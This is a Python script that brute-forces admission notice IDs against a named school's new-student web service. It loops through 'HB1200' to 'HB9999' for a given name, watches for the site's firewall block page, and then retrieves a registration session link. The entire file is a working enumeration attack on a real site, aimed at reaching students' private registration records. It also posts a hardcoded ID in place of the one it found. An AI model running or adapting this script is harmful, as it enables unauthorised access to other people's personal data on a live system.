import requests
import json
import asyncio
headers = {
    "User-Agent": 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3',
    'Accept': 'application/json',
    'Accept-Language': 'zh-CN,zh;q=0.8,zh-TW;q=,0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2',
    'Accept-Encoding': 'gzip, deflate, br',
    'Content-Type': 'application/json;utf-8',
    'X-Requested-With': 'XMLHttpRequest',
    'Content-Length': '34',
    'Origin': 'https://oa.cqyz.cn',
    'DNT': '1',
    'Connection': 'keep-alive',
    'Referer': 'https://oa.cqyz.cn/ns/',
    'Sec-Fetch-Dest': 'empty',
    'Sec-Fetch-Mode': 'cors',
    'Sec-Fetch-Site': 'same-origin',
    'TE': 'trailers',
}
n = 3
name = ""
task_list = []
url = "https://oa.cqyz.cn/Web%20Services/student.asmx/NewStudents_Get2"
finded_id = ''
start = 1200
end = 9999
times = end - start + 1


async def find_id(name, start_num, end_num):
    global finded_id
    for num in range(start_num, end_num):
        await asyncio.sleep(0)
        id = 'HB{}'.format(str(num))
        post_json = json.dumps({'name': name, 'noticeId': id})
        response = requests.post(url=url, headers=headers, data=post_json)
        content = response.text
        if "Error" not in content:
            if "safedog" in content:
                finded_id = "Blocked"
                raise ValueError("Blocked")
            elif "JumpSelf" in content:
                finded_id = "JumpSelf"
                raise ValueError("JumpSelf")
            else:
                finded_id = id
                await asyncio.sleep(0)
                raise ValueError("finded!")

        print(str(start_num)+": "+id)


async def main():
    for i in range(0, n):
        start_num = start+times//n*i
        task = find_id(name, start_num, start_num+times//n)
        task_list.append(asyncio.ensure_future(task))
    if times % n != 0:
        last_task = find_id(name, end-times % n+1, end)
        task_list.append(asyncio.ensure_future(last_task))
    done, pending = await asyncio.wait(task_list, return_when=asyncio.FIRST_EXCEPTION)
    print(finded_id)
    if finded_id != "JumpSelf" and finded_id != "Blocked" and finded_id != "":
        post_json = json.dumps({'name': name, 'noticeId': "HB1262"})
        response = requests.post(url=url, headers=headers, data=post_json)
        sid = json.loads(response.text)["d"]["id"]
        print(
            "sid: "+f"https://oa.cqyz.cn/Modules/NewStudent/nsregister.html?sid={sid}")
if __name__ == '__main__':
    asyncio.run(main())